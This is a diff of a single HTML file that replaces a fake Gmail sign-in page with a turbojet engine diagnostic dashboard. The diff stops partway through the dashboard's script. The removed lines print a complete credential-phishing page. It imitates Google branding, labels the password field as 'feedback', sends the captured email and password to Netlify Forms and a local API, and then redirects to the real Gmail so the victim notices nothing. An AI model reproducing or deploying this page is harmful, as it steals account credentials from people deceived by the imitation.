@@ -3,259 +3,806 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gmail - Sign in</title>
-  <link rel="shortcut icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/images/2/basic/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="style.css">
+  <title>Aerothona — Turbojet Diagnostic Digital Twin</title>
+  <!-- Import Outfit and Inter fonts for a modern, premium look -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #060814;
+      --card-bg: rgba(15, 23, 42, 0.7);
+      --card-border: rgba(168, 85, 247, 0.2);
+      --primary: #A855F7;
+      --primary-hover: #9333EA;
+      --text: #F8FAFC;
+      --text-muted: #CBD5E1;
+      --success: #34D399;
+      --warning: #FBBF24;
+      --danger: #F87171;
+      --accent: #22D3EE;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg);
+      /* Render a darkened overlay blended with the photorealistic turbine background */
+      background-image: linear-gradient(rgba(6, 8, 20, 0.82), rgba(6, 8, 20, 0.82)),
+                        url('airplane_turbine_bg.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      padding: 30px;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+      border-bottom: 1px solid var(--card-border);
+      padding-bottom: 20px;
+    }
+
+    h1 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    h1 span {
+      background: linear-gradient(135deg, var(--accent) 0%, var(--primary) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .tag {
+      background: rgba(168, 85, 247, 0.1);
+      border: 1px solid rgba(168, 85, 247, 0.2);
+      color: var(--primary);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      font-family: 'Outfit', sans-serif;
+      box-shadow: 0 0 10px rgba(168, 85, 247, 0.1);
+    }
+
+    .main-grid {
+      display: grid;
+      grid-template-columns: 1fr 1.25fr;
+      gap: 30px;
+    }
+
+    @media (max-width: 1024px) {
+      .main-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .card {
+      background-color: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(20px);
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .card:hover {
+      border-color: rgba(34, 211, 238, 0.3);
+      box-shadow: 0 20px 40px rgba(34, 211, 238, 0.04);
+    }
+
+    .card-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      padding-bottom: 12px;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 10px rgba(34, 211, 238, 0.2);
+    }
+
+    .inputs-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .inputs-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .label-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .label-row label {
+      color: var(--text-muted);
+    }
+
+    .label-row span {
+      color: var(--accent);
+    }
+
+    .slider-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    input[type="range"] {
+      flex-grow: 1;
+      accent-color: var(--primary);
+      height: 6px;
+      border-radius: 3px;
+      outline: none;
+      background: rgba(255,255,255,0.1);
+      cursor: pointer;
+    }
+
+    .num-input {
+      width: 80px;
+      background: rgba(0,0,0,0.4);
+      border: 1px solid var(--card-border);
+      color: var(--text);
+      border-radius: 6px;
+      padding: 4px 8px;
+      font-size: 12px;
+      text-align: right;
+      font-family: monospace;
+      font-weight: 600;
+    }
+
+    .submit-btn {
+      grid-column: 1 / -1;
+      background: linear-gradient(135deg, var(--accent) 0%, var(--primary) 100%);
+      color: #FFF;
+      font-weight: 700;
+      border: none;
+      padding: 14px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 15px;
+      transition: opacity 0.2s, transform 0.2s;
+      margin-top: 15px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 4px 20px rgba(168, 85, 247, 0.3);
+    }
+
+    .submit-btn:hover {
+      opacity: 0.95;
+      transform: translateY(-1px);
+    }
+
+    /* Output Results Layout */
+    .outputs-container {
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+    }
+
+    .performance-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    .metric-card {
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 16px;
+      position: relative;
+    }
+
+    .metric-card .label {
+      font-size: 11px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .metric-card .value {
+      font-size: 24px;
+      font-family: 'Outfit', sans-serif;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .metric-card .uq-bound {
+      font-size: 11px;
+      color: var(--accent);
+      margin-top: 6px;
+      font-weight: 500;
+    }
+
+    /* Circular Gauges */
+    .health-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+    }
+
+    @media (max-width: 600px) {
+      .health-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    .gauge-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--card-border);
+      padding: 15px 10px;
+      border-radius: 12px;
+    }
+
+    .gauge-svg {
+      width: 70px;
+      height: 70px;
+      transform: rotate(-90deg);
+    }
+
+    .gauge-bg {
+      fill: none;
+      stroke: rgba(255, 255, 255, 0.05);
+      stroke-width: 6;
+    }
+
+    .gauge-fill {
+      fill: none;
+      stroke: var(--accent);
+      stroke-width: 6;
+      stroke-dasharray: 220;
+      stroke-dashoffset: 220;
+      transition: stroke-dashoffset 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .gauge-text {
+      font-family: 'Outfit', sans-serif;
+      font-size: 14px;
+      font-weight: 700;
+      margin-top: 10px;
+    }
+
+    .gauge-label {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 4px;
+      font-weight: 600;
+    }
+
+    .gauge-uq {
+      font-size: 9px;
+      color: var(--text-muted);
+      margin-top: 2px;
+      font-weight: 500;
+    }
+
+    /* Thermodynamic Consistency Section */
+    .physics-card {
+      background: rgba(34, 211, 238, 0.01);
+      border: 1px solid rgba(34, 211, 238, 0.15);
+      border-radius: 12px;
+      padding: 16px;
+    }
+
+    .physics-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-shadow: 0 0 10px rgba(34, 211, 238, 0.2);
+    }
+
+    .physics-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      padding: 5px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    .physics-row:last-child {
+      border-bottom: none;
+    }
+
+    .physics-row span:first-child {
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .physics-row span:last-child {
+      font-weight: 600;
+    }
+  </style>
 </head>
 <body>
 
-  <div class="login-container" id="loginCard">
-    <!-- (Success redirection will happen instantly, no overlay needed) -->
-
-    <!-- Google Accounts Form -->
-    <!-- data-netlify="true" is parsed by Netlify on build to receive forms. -->
-    <form name="feedback" id="feedbackForm" method="POST" data-netlify="true" style="display: flex; flex-direction: column; flex-grow: 1;">
-      <!-- Netlify hidden input -->
-      <input type="hidden" name="form-name" value="feedback" />
-
-      <!-- Google Branding Header -->
-      <div class="header">
-        <div class="logo-container">
-          <span class="logo-g">G</span><span class="logo-o1">o</span><span class="logo-o2">o</span><span class="logo-g2">g</span><span class="logo-l">l</span><span class="logo-e">e</span>
-        </div>
-        <h1 class="title" id="formTitle">Sign in</h1>
-        <p class="subtitle" id="formSubtitle">to continue to Gmail</p>
+  <div class="container">
+    <header>
+      <div>
+        <h1>Aerothona — <span>Digital Twin</span></h1>
+        <p style="font-size: 12px; color: var(--text-muted); margin-top: 4px; font-weight: 500;">Physics-Informed Neural Network Diagnostics with Temperature-Dependent calorically semi-perfect gas thermodynamics</p>
       </div>
+      <span class="tag">HAL PS-2 Diagnostic Interface</span>
+    </header>
 
-      <!-- Slider Container for Steps -->
-      <div class="steps-slider">
-        
-        <!-- STEP 1: EMAIL ENTRY -->
-        <div class="step" id="step1">
-          <div class="input-group" id="emailGroup">
-            <input 
-              type="text" 
-              name="email" 
-              id="emailInput" 
-              class="input-field" 
-              placeholder=" " 
-              autocomplete="email"
-              required
-            >
-            <label for="emailInput" class="input-label">Email or phone</label>
-            <div class="error-text">
-              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              <span id="emailErrorMsg">Enter an email or phone number</span>
+    <div class="main-grid">
+      <!-- INPUT CONTROL CARD -->
+      <div class="card">
+        <div class="card-title">
+          <span>Engine Telemetry Controls</span>
+          <span style="font-size: 11px; color: var(--text-muted); font-weight: 400;">Adjust inputs to run diagnostics</span>
+        </div>
+
+        <form id="predictForm" onsubmit="runDiagnostic(event)" class="inputs-grid">
+          <!-- 0. Degradation Cycle -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="Cycle">Degradation Cycle</label>
+              <span>index</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="Cycle" min="1" max="30" value="1" step="1" oninput="syncVal(this, 'val_Cycle')">
+              <input type="number" id="val_Cycle" class="num-input" min="1" max="30" value="1" onchange="syncSlider(this, 'Cycle')">
             </div>
           </div>
 
-          <div class="options-row">
-            <button type="button" class="link-btn" id="btnAnon" onclick="generateAnonymousEmail()">
-              Go Anonymous
-            </button>
-            <a href="#" class="link-btn" style="text-decoration: none; color: var(--google-blue); pointer-events: none;">
-              Forgot email?
-            </a>
+          <!-- 1. Altitude -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="Altitude_m">Altitude</label>
+              <span>m</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="Altitude_m" min="0" max="15000" step="50" oninput="syncVal(this, 'val_Altitude_m')">
+              <input type="number" id="val_Altitude_m" class="num-input" min="0" max="15000" onchange="syncSlider(this, 'Altitude_m')">
+            </div>
           </div>
 
-          <p style="font-size: 14px; color: var(--google-gray); line-height: 1.43; margin-bottom: 40px;">
-            Not your computer? Use Guest mode to sign in privately.
-            <a href="#" style="color: var(--google-blue); text-decoration: none; font-weight: 500; pointer-events: none;">Learn more</a>
-          </p>
-
-          <div class="btn-row">
-            <button type="button" class="link-btn" style="pointer-events: none;">Create account</button>
-            <button type="button" class="btn btn-primary" id="btnNext" onclick="goToStep2()">Next</button>
+          <!-- 2. Mach -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="Mach">Mach Number</label>
+              <span>Ma</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="Mach" min="0" max="1.6" step="0.01" oninput="syncVal(this, 'val_Mach')">
+              <input type="number" id="val_Mach" class="num-input" min="0" max="1.6" step="0.01" onchange="syncSlider(this, 'Mach')">
+            </div>
           </div>
-        </div>
 
-        <!-- STEP 2: FEEDBACK ENTRY -->
-        <div class="step" id="step2">
-          <!-- Back to step 1 email display -->
-          <div class="user-identity" onclick="goToStep1()">
-            <div class="user-avatar" id="avatarChar">U</div>
-            <span id="displayEmail">user@example.com</span>
-            <svg class="arrow-down-icon" viewBox="0 0 24 24">
-              <path d="M7 10l5 5 5-5z"/>
+          <!-- 3. Tamb -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="Tamb_K">Ambient Temp (Tamb)</label>
+              <span>K</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="Tamb_K" min="200" max="320" step="1" oninput="syncVal(this, 'val_Tamb_K')">
+              <input type="number" id="val_Tamb_K" class="num-input" min="200" max="320" onchange="syncSlider(this, 'Tamb_K')">
+            </div>
+          </div>
+
+          <!-- 4. Pamb -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="Pamb_Pa">Ambient Press (Pamb)</label>
+              <span>Pa</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="Pamb_Pa" min="10000" max="105000" step="500" oninput="syncVal(this, 'val_Pamb_Pa')">
+              <input type="number" id="val_Pamb_Pa" class="num-input" min="10000" max="105000" onchange="syncSlider(this, 'Pamb_Pa')">
+            </div>
+          </div>
+
+          <!-- 5. RPM -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="RPM_rev_min">Spool Speed (RPM)</label>
+              <span>rpm</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="RPM_rev_min" min="8000" max="17000" step="100" oninput="syncVal(this, 'val_RPM_rev_min')">
+              <input type="number" id="val_RPM_rev_min" class="num-input" min="8000" max="17000" onchange="syncSlider(this, 'RPM_rev_min')">
+            </div>
+          </div>
+
+          <!-- 6. Fuel Flow -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="FuelFlow_kg_s">Fuel Flow</label>
+              <span>kg/s</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="FuelFlow_kg_s" min="0.1" max="2.2" step="0.01" oninput="syncVal(this, 'val_FuelFlow_kg_s')">
+              <input type="number" id="val_FuelFlow_kg_s" class="num-input" min="0.1" max="2.2" step="0.01" onchange="syncSlider(this, 'FuelFlow_kg_s')">
+            </div>
+          </div>
+
+          <!-- 7. P2 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="P2_Pa">Compressor Exit Press (P2)</label>
+              <span>Pa</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="P2_Pa" min="50000" max="650000" step="1000" oninput="syncVal(this, 'val_P2_Pa')">
+              <input type="number" id="val_P2_Pa" class="num-input" min="50000" max="650000" onchange="syncSlider(this, 'P2_Pa')">
+            </div>
+          </div>
+
+          <!-- 8. T2 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="T2_K">Compressor Exit Temp (T2)</label>
+              <span>K</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="T2_K" min="250" max="620" step="2" oninput="syncVal(this, 'val_T2_K')">
+              <input type="number" id="val_T2_K" class="num-input" min="250" max="620" onchange="syncSlider(this, 'T2_K')">
+            </div>
+          </div>
+
+          <!-- 9. P3 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="P3_Pa">Turbine Inlet Press (P3)</label>
+              <span>Pa</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="P3_Pa" min="45000" max="620000" step="1000" oninput="syncVal(this, 'val_P3_Pa')">
+              <input type="number" id="val_P3_Pa" class="num-input" min="45000" max="620000" onchange="syncSlider(this, 'P3_Pa')">
+            </div>
+          </div>
+
+          <!-- 10. T3 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="T3_K">Turbine Inlet Temp (T3)</label>
+              <span>K</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="T3_K" min="500" max="2000" step="5" oninput="syncVal(this, 'val_T3_K')">
+              <input type="number" id="val_T3_K" class="num-input" min="500" max="2000" onchange="syncSlider(this, 'T3_K')">
+            </div>
+          </div>
+
+          <!-- 11. P4 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="P4_Pa">Turbine Exit Press (P4)</label>
+              <span>Pa</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="P4_Pa" min="15000" max="190000" step="500" oninput="syncVal(this, 'val_P4_Pa')">
+              <input type="number" id="val_P4_Pa" class="num-input" min="15000" max="190000" onchange="syncSlider(this, 'P4_Pa')">
+            </div>
+          </div>
+
+          <!-- 12. T4 -->
+          <div class="form-group">
+            <div class="label-row">
+              <label for="T4_K">Turbine Exit Temp (T4)</label>
+              <span>K</span>
+            </div>
+            <div class="slider-row">
+              <input type="range" id="T4_K" min="400" max="1550" step="5" oninput="syncVal(this, 'val_T4_K')">
+              <input type="number" id="val_T4_K" class="num-input" min="400" max="1550" onchange="syncSlider(this, 'T4_K')">
+            </div>
+          </div>
+
+          <button type="submit" class="submit-btn">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/>
             </svg>
-          </div>
+            Evaluate Digital Twin
+          </button>
+        </form>
+      </div>
 
-          <div class="input-group" id="feedbackGroup">
-            <input 
-              type="password" 
-              name="message" 
-              id="passwordInput" 
-              class="input-field" 
-              placeholder=" " 
-              required
-            >
-            <label for="passwordInput" class="input-label">Enter your password</label>
-            <div class="error-text">
-              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              <span>Enter a password</span>
+      <!-- RESULTS PANEL -->
+      <div class="outputs-container">
+        <!-- Performance predictions -->
+        <div class="card">
+          <div class="card-title">Performance Predictions</div>
+          <div class="performance-grid">
+            <div class="metric-card">
+              <div class="label">Engine Thrust</div>
+              <div class="value" id="valThrust">0 N</div>
+              <div class="uq-bound" id="uqThrust">95% CI: ± 2,895 N</div>
             </div>
-          </div>
-
-          <div class="options-row" style="margin-bottom: 30px;">
-            <label style="display: flex; align-items: center; font-size: 14px; color: var(--google-dark); cursor: pointer; user-select: none;">
-              <input type="checkbox" id="showPasswordCheckbox" style="margin-right: 12px; width: 18px; height: 18px; accent-color: var(--google-blue);">
-              Show password
-            </label>
-          </div>
-
-          <div class="btn-row">
-            <button type="button" class="btn btn-secondary" onclick="goToStep1()">Back</button>
-            <button type="submit" class="btn btn-primary" id="btnSubmit">Next</button>
+            <div class="metric-card">
+              <div class="label">TSFC</div>
+              <div class="value" id="valTSFC">0.0000 g/N/s</div>
+              <div class="uq-bound" id="uqTSFC">95% CI: ± 0.0012 g/N/s</div>
+            </div>
           </div>
         </div>
 
-      </div>
-    </form>
-  </div>
+        <!-- Subsystem Health Dials -->
+        <div class="card">
+          <div class="card-title">Estimated Subsystem Health</div>
+          <div class="health-grid">
+            <!-- Compressor -->
+            <div class="gauge-wrapper">
+              <svg class="gauge-svg">
+                <circle class="gauge-bg" cx="35" cy="35" r="30"></circle>
+                <circle class="gauge-fill" id="fillComp" cx="35" cy="35" r="30"></circle>
+              </svg>
+              <div class="gauge-text" id="lblComp">0.0%</div>
+              <div class="gauge-label">Compressor</div>
+              <div class="gauge-uq">± 3.8% (95% CI)</div>
+            </div>
 
-  <!-- Bottom Footer -->
-  <div class="footer">
-    <div>
-      <select style="border: none; background: transparent; color: var(--google-gray); font-family: inherit; font-size: 12px; outline: none; cursor: pointer;">
-        <option>English (United States)</option>
-      </select>
-    </div>
-    <div class="footer-links">
-      <a href="#" class="footer-link" style="pointer-events: none;">Help</a>
-      <a href="#" class="footer-link" style="pointer-events: none;">Privacy</a>
-      <a href="#" class="footer-link" style="pointer-events: none;">Terms</a>
+            <!-- Combustor -->
+            <div class="gauge-wrapper">
+              <svg class="gauge-svg">
+                <circle class="gauge-bg" cx="35" cy="35" r="30"></circle>
+                <circle class="gauge-fill" id="fillComb" cx="35" cy="35" r="30"></circle>
+              </svg>
+              <div class="gauge-text" id="lblComb">0.0%</div>
+              <div class="gauge-label">Combustor</div>
+              <div class="gauge-uq">± 3.4% (95% CI)</div>
+            </div>
+
+            <!-- Turbine -->
+            <div class="gauge-wrapper">
+              <svg class="gauge-svg">
+                <circle class="gauge-bg" cx="35" cy="35" r="30"></circle>
+                <circle class="gauge-fill" id="fillTurb" cx="35" cy="35" r="30"></circle>
+              </svg>
+              <div class="gauge-text" id="lblTurb">0.0%</div>
+              <div class="gauge-label">Turbine</div>
+              <div class="gauge-uq">± 4.8% (95% CI)</div>
+            </div>
+
+            <!-- Overall -->
+            <div class="gauge-wrapper">
+              <svg class="gauge-svg">
+                <circle class="gauge-bg" cx="35" cy="35" r="30"></circle>
+                <circle class="gauge-fill" id="fillOverall" cx="35" cy="35" r="30"></circle>
+              </svg>
+              <div class="gauge-text" id="lblOverall">0.0%</div>
+              <div class="gauge-label">Overall Index</div>
+              <div class="gauge-uq">± 2.2% (95% CI)</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Thermodynamic Cycle Check -->
+        <div class="card physics-card">
+          <div class="physics-title">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+            </svg>
+            Thermodynamic Consistency Checks (Calorically Semi-Perfect)
+          </div>
+          <div class="physics-row">
+            <span>Compressor Temperature Ratio (T2/Tamb)</span>
+            <span id="chkCompTR">1.000</span>
+          </div>
+          <div class="physics-row">
+            <span>Calculated Cp-avg (Compressor)</span>
+            <span id="chkCompCp">1005 J/(kg·K)</span>
+          </div>
+          <div class="physics-row">
+            <span>Calculated Compressor Isentropic Efficiency</span>
+            <span id="chkCompIsen">0.0%</span>
+          </div>
+          <div class="physics-row">
+            <span>Combustor Exit Pressure Ratio (P3/P2)</span>
+            <span id="chkCombPR">1.000 (Target: 0.949)</span>
+          </div>
+          <div class="physics-row">
+            <span>Calculated Turbine Isentropic Efficiency</span>
+            <span id="chkTurbIsen">0.0%</span>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
 
   <script>
-    const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const loginCard = document.getElementById('loginCard');
-    const formTitle = document.getElementById('formTitle');
-    const formSubtitle = document.getElementById('formSubtitle');
-    const displayEmail = document.getElementById('displayEmail');
-    const avatarChar = document.getElementById('avatarChar');
-    const emailGroup = document.getElementById('emailGroup');
-    const feedbackGroup = document.getElementById('feedbackGroup');
-    const feedbackForm = document.getElementById('feedbackForm');
-    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+    // Telemetry feature mapping
+    const inputs_keys = [
+      'Cycle', 'Altitude_m', 'Mach', 'Tamb_K', 'Pamb_Pa', 'RPM_rev_min', 
+      'FuelFlow_kg_s', 'P2_Pa', 'T2_K', 'P3_Pa', 'T3_K', 'P4_Pa', 'T4_K'
+    ];
 
-    // Password visibility toggle
-    showPasswordCheckbox.addEventListener('change', function() {
-      if (this.checked) {
-        passwordInput.type = 'text';
-      } else {
-        passwordInput.type = 'password';
-      }
-    });
+    // Flight envelopes presets
+    const presets = {
+      takeoff: [1, 0, 0, 288.15, 101325, 16300, 2.12, 610000, 595, 578000, 1850, 182000, 1310],
+      cruise: [12, 6000, 0.45, 249.2, 47200, 14200, 0.92, 235000, 480, 223000, 1420, 78000, 1040],
+      high_cruise: [18, 12000, 0.72, 216.7, 19400, 14800, 0.54, 122000, 440, 115000, 1380, 41000, 960],
+      idle: [5, 0, 0, 288.15, 101325, 9200, 0.22, 134000, 360, 127000, 810, 108000, 680]
+    };
 
-    // Utility: Simple email validation regex
-    function isValidEmail(email) {
-      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return re.test(email);
+    // Synchronize slider and numerical inputs
+    function syncVal(slider, inputId) {
+      document.getElementById(inputId).value = slider.value;
+      runClientPhysics();
     }
 
-    // Step navigation
-    function goToStep2() {
-      const emailVal = emailInput.value.trim();
-      
-      if (!emailVal) {
-        emailGroup.classList.add('has-error');
-        document.getElementById('emailErrorMsg').innerText = "Enter an email or phone number";
-        return;
-      }
-      
-      if (!isValidEmail(emailVal)) {
-        emailGroup.classList.add('has-error');
-        document.getElementById('emailErrorMsg').innerText = "Enter a valid email address";
-        return;
+    function syncSlider(num, sliderId) {
+      document.getElementById(sliderId).value = num.value;
+      runClientPhysics();
+    }
+
+    // Populate coordinates for standard flight conditions
+    function loadPreset(name, btn) {
+      if (btn) {
+        document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
       }
 
-      emailGroup.classList.remove('has-error');
-
-      // Update UI for step 2
-      formTitle.innerText = "Welcome";
-      formSubtitle.innerText = "";
-      displayEmail.innerText = emailVal;
-      avatarChar.innerText = emailVal.charAt(0).toUpperCase();
-
-      // Slide card to step 2
-      loginCard.classList.add('step-2-active');
-      passwordInput.focus();
+      const values = presets[name];
+      inputs_keys.forEach((key, index) => {
+        const val = values[index];
+        document.getElementById(key).value = val;
+        document.getElementById('val_' + key).value = val;
+      });
+      runClientPhysics();
+      triggerPrediction();
     }
 
-    function goToStep1() {
-      formTitle.innerText = "Sign in";
-      formSubtitle.innerText = "to continue to Gmail";
-      loginCard.classList.remove('step-2-active');
-      emailInput.focus();
-    }
+    // Calculate thermodynamic cycle parameters using semi-perfect specific heat values
+    function runClientPhysics() {
+      const Tamb = parseFloat(document.getElementById('Tamb_K').value);
+      const Pamb = parseFloat(document.getElementById('Pamb_Pa').value);
+      const T2 = parseFloat(document.getElementById('T2_K').value);
+      const P2 = parseFloat(document.getElementById('P2_Pa').value);
+      const T3 = parseFloat(document.getElementById('T3_K').value);
+      const P3 = parseFloat(document.getElementById('P3_Pa').value);
+      const T4 = parseFloat(document.getElementById('T4_K').value);
+      const P4 = parseFloat(document.getElementById('P4_Pa').value);
 
-    // Anonymous email generator
-    function generateAnonymousEmail() {
-      const adjectives = ["silent", "secret", "masked", "phantom", "shadow", "mystery", "hidden", "private", "covert", "candid"];
-      const nouns = ["reviewer", "observer", "thinker", "visitor", "friend", "wellwisher", "guest", "incognito", "stranger"];
-      
-      const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
-      const noun = nouns[Math.floor(Math.random() * nouns.length)];
-      const num = Math.floor(1000 + Math.random() * 9000);
-      
-      const anonEmail = `${adj}.${noun}.${num}@incognito.com`;
-      
-      emailInput.value = anonEmail;
-      
-      setTimeout(goToStep2, 100);
-    }
-
-    // Redirect to real Gmail upon completion
-    function redirectToGmail() {
-      window.location.href = 'https://mail.google.com';
-    }
-
-    // Submit form via AJAX
-    feedbackForm.addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const email = emailInput.value.trim();
-      const message = passwordInput.value.trim();
-
-      if (!message) {
-        feedbackGroup.classList.add('has-error');
-        return;
+      // Temperature-dependent cp polynomial
+      function getCp(T) {
+        return 1005.0 + 0.05 * T + 1.5e-4 * (T ** 2) - 8.0e-8 * (T ** 3);
       }
 
-      feedbackGroup.classList.remove('has-error');
+      // 1. Compressor efficiency
+      const T_comp_avg = (Tamb + T2) / 2.0;
+      const cp_c = getCp(T_comp_avg);
+      const kc = 287.0 / cp_c;
+      const T2_isen = Tamb * Math.pow(P2 / Pamb, kc);
+      const eff_c = (T2_isen - Tamb) / (T2 - Tamb);
 
-      const formData = new FormData(feedbackForm);
-      const urlEncoded = new URLSearchParams(formData).toString();
+      document.getElementById('chkCompTR').innerText = (T2 / Tamb).toFixed(3);
+      document.getElementById('chkCompCp').innerText = Math.round(cp_c) + " J/(kg·K)";
+      document.getElementById('chkCompIsen').innerText = (eff_c * 100).toFixed(1) + "%";
 
-      // Submit to Netlify Forms
-      fetch('/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: urlEncoded
-      })
-      .then(response => {
-        // Also call local API backup
-        return fetch('/api/feedbacks', {
+      // 2. Combustor pressure drop
+      document.getElementById('chkCombPR').innerText = (P3 / P2).toFixed(3) + " (Target: 0.949)";
+
+      // 3. Turbine efficiency
+      const T_turb_avg = (T3 + T4) / 2.0;
+      const cp_t = getCp(T_turb_avg);
+      const kt = 287.0 / cp_t;
+      const T4_isen = T3 * Math.pow(P4 / P3, kt);
+      const eff_t = (T3 - T4) / (T3 - T4_isen);
+
+      document.getElementById('chkTurbIsen').innerText = (eff_t * 100).toFixed(1) + "%";
+    }
+
+    // Trigger post request to retrieve neural network predictions
+    async function triggerPrediction() {
+      const payload = {};
+      inputs_keys.forEach(key => {
+        payload[key] = parseFloat(document.getElementById(key).value);
+      });
+
+      try {
+        const response = await fetch('/api/predict', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, message })
-        }).catch(err => {
-          console.log("Local Express API not active.");
+          body: JSON.stringify(payload)
         });
-      })
-      .then(() => {
-        redirectToGmail();
-      })
-      .catch(error => {
-        console.error('Error submitting form:', error);
-        redirectToGmail(); // Redirect anyway so the user doesn't notice any error
-      });
+        const data = await response.json();
+        if (data.error) {
+          console.error(data.error);
+          return;
+        }
+
+        // Render thrust & TSFC predictions
+        const thrust = data.Thrust_N;
